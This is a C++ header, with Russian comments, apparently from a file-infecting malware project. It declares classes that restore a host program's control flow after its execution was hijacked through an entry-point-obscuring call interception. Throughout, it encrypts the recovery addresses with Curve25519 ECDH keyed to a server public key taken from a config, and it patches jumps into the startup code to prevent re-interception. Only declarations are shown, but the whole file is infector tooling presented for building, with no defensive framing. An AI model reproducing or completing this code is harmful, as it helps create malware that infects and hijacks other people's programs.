#pragma once
#include"global.hpp"
#include "configreader.h"

extern "C"
{
#include "crypto\ed25519\ed25519.h"
#include "crypto\ecrypt-portable.h"
}


// интерфейс для восстановления управления хостового апп
class IHostRestorator
{
public:
	virtual ~IHostRestorator() = default;
	// заполняет структуру для восстановления хоста по адресу lpRestoratorBlock
	// dwRestorationBlockSize - ее размер для определения, что верная структура была подана (ассерты)
	// lpParameter - указатель на параметры для конкретной реализации
	// dwParameterSize - размер параметра для определения, что верные параметры были поданы
	// конкретные параметры зависят от имплементации интерфейса
	virtual VOID create_restorator_block(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize, LPBYTE lpParameter, SIZE_T dwParameterSize) = 0;
	// производит восстанавливающие операции
	virtual VOID restore(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize) = 0;
};

#pragma pack(1)
struct CallRestoratorRVA
{
	DWORD32 dwRVAOriginalFunction; // RVA оригинальной функции вызов на которую был перехвачен
	DWORD32 dwRVAStartupBegin; // RVA начала стартап кода
	DWORD32 dwRVAstartupEnd; // RVA конца стартап кода
};
#pragma pack()

#pragma pack(1)
struct CallRestoratorBlock
{
	// нужно для ECDH между Curve25519_private_key и public-сервер ключем из конфига для создания общего секрета которым шифруютя RVA
	unsigned char Curve25519_private_key[sign_ed25519_PRIVATEKEYBYTES];
	CallRestoratorRVA RVAs;
};
#pragma pack()

// восстанавливает управление полученное через EPO-технику перехвата call, структура зашифрована через ECDH алгоритм Curve25519
// ставит jmp на оригинальную функцию в конец стартап кода и в начало. Таким образом обеспечивается восстановление для текущего перехвата
// и предотвращается новый перехват засчет немедленного возврата. Можно было бы изменить перехваченный call, но это потребовало изменения прав доступа к странице
// а данный вариант работает основываясь уже на том, что мы имеем
class CallRestoratorX25519 : public IHostRestorator
{
public:
	CallRestoratorX25519();
	~CallRestoratorX25519();
	// lpRestoratorBlock - указатель на CallRestoratorBlock
	// lpParameter - указатель на CallRestoratorRVA, все кроме RVA полей игнорируется. RVA поля параметра переносятся в lpRestoratorBlock и шифруются 
	VOID create_restorator_block(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize, LPBYTE lpParameter, SIZE_T dwParameterSize);
	// расшифровывает RVA и производит восстановление
	VOID restore(LPBYTE lpRestoratorBlock, SIZE_T dwRestoratorBlockSize);
private:
	struct _reskeys
	{
		unsigned char restorator_privkey[sign_ed25519_PRIVATEKEYBYTES];
		unsigned char restorator_pubkey[sign_ed25519_PUBLICKEYBYTES];
		unsigned char restorator_seed[sign_ed25519_SEEDBYTES];
		unsigned char restorator_sharedsecret[sign_ed25519_SHAREDSECBYTES];
	} restore_keys;

	VOID create_reskeys();

	HMODULE hHostModule;
	ECRYPT_ctx ctx;
	unsigned char chIV[ECRYPT_MAXIVSIZE / 8];
};
